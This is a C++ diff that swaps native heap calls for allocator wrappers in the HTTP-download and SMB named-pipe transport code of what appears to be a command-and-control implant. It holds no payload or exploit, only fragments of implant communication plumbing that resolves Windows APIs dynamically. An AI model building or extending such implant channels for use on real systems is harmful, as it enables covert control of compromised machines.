@@ -100,7 +100,7 @@ namespace Http {
 
             if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->Handle, endpoint, &autoproxy_opts, &proxy_info)) {
                 Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);
-                Ctx->Transport.EnvProxy     = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, Ctx->Transport.EnvProxyLen);
+                Ctx->Transport.EnvProxy     = x_malloc(Ctx->Transport.EnvProxyLen);
 
                 x_memcpy(Ctx->Transport.EnvProxy, &proxy_info, Ctx->Transport.EnvProxyLen);
 
@@ -113,7 +113,7 @@ namespace Http {
                         proxy_info.lpszProxyBypass   = proxy_config.lpszProxyBypass;
                         Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);
 
-                        Ctx->Transport.EnvProxy = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, Ctx->Transport.EnvProxyLen);
+                        Ctx->Transport.EnvProxy = x_malloc(Ctx->Transport.EnvProxyLen);
                         x_memcpy(Ctx->Transport.EnvProxy, &proxy_info, Ctx->Transport.EnvProxyLen);
 
                         proxy_config.lpszProxy       = nullptr;
@@ -127,7 +127,7 @@ namespace Http {
                         Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->Handle, endpoint, &autoproxy_opts, &proxy_info);
                         Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);
 
-                        Ctx->Transport.EnvProxy = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, Ctx->Transport.EnvProxyLen);
+                        Ctx->Transport.EnvProxy = x_malloc(Ctx->Transport.EnvProxyLen);
                         x_memcpy(Ctx->Transport.EnvProxy, &proxy_info, Ctx->Transport.EnvProxyLen);
                     }
                 }
@@ -159,15 +159,13 @@ namespace Http {
                 !(Ctx->win32.WinHttpQueryDataAvailable(request, &length))) {
                 return_defer(ntstatus);
             }
-
             if (!buffer) {
-                buffer = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length + 1);
+                buffer = x_malloc(length + 1);
             }
-
             if (!download) {
-                download = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, length + 1);
+                download = x_malloc(length + 1);
             } else {
-                download = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, download, total + length + 1);
+                download = x_realloc(download, total + length + 1);
             }
 
             x_memset(buffer, 0, length + 1);
@@ -182,7 +180,7 @@ namespace Http {
 
         } while (length > 0);
 
-        (*in) = S_CAST(_stream*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_stream)));
+        (*in) = S_CAST(_stream*, x_malloc(sizeof(_stream)));
         (*in)->Buffer = download;
         (*in)->Length = total;
 
@@ -190,9 +188,9 @@ namespace Http {
         if (request) { Ctx->win32.WinHttpCloseHandle(request); }
         if (connect) { Ctx->win32.WinHttpCloseHandle(connect); }
 
-        if (proxy_config.lpszProxy) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, proxy_config.lpszProxy); }
-        if (proxy_config.lpszProxyBypass) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, proxy_config.lpszProxyBypass); }
-        if (proxy_config.lpszAutoConfigUrl) { Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, proxy_config.lpszAutoConfigUrl); }
+        if (proxy_config.lpszProxy) { x_free(proxy_config.lpszProxy); }
+        if (proxy_config.lpszProxyBypass) { x_free(proxy_config.lpszProxyBypass); }
+        if (proxy_config.lpszAutoConfigUrl) { x_free(proxy_config.lpszAutoConfigUrl); }
     }
 }
 
@@ -210,10 +208,10 @@ namespace Smb {
             SmbSecAttr->SidLow = nullptr;
         }
         if (SmbSecAttr->pAcl) {
-            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, SmbSecAttr->pAcl);
+            x_free(SmbSecAttr->pAcl);
         }
         if (SmbSecAttr->SecDesc) {
-            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, SmbSecAttr->SecDesc);
+            x_free(SmbSecAttr->SecDesc);
         }
     }
 
@@ -247,7 +245,7 @@ namespace Smb {
             return_defer(ERROR_INVALID_SID);
         }
 
-        if (!(SmbSecAttr->pAcl = S_CAST(PACL, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, MAX_PATH)))) {
+        if (!(SmbSecAttr->pAcl = S_CAST(PACL, x_malloc(MAX_PATH)))) {
             return_defer(ERROR_NOT_ENOUGH_MEMORY);
         }
 
@@ -257,7 +255,7 @@ namespace Smb {
             return_defer(ERROR_NO_ACE_CONDITION);
         }
 
-        if (!(SmbSecAttr->SecDesc = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, SECURITY_DESCRIPTOR_MIN_LENGTH))) {
+        if (!(SmbSecAttr->SecDesc = x_malloc(SECURITY_DESCRIPTOR_MIN_LENGTH))) {
             return_defer(ERROR_INVALID_SECURITY_DESCR);
         }
 
@@ -347,8 +345,8 @@ namespace Smb {
                 return_defer(ERROR_NOT_READY);
             }
 
-            (*in) = S_CAST(_stream*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_stream)));
-            (*in)->Buffer = Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, msg_length);
+            (*in) = S_CAST(_stream*, x_malloc(sizeof(_stream)));
+            (*in)->Buffer = x_malloc(msg_length);
             (*in)->Length = msg_length;
 
             PipeRead(*in, handle);
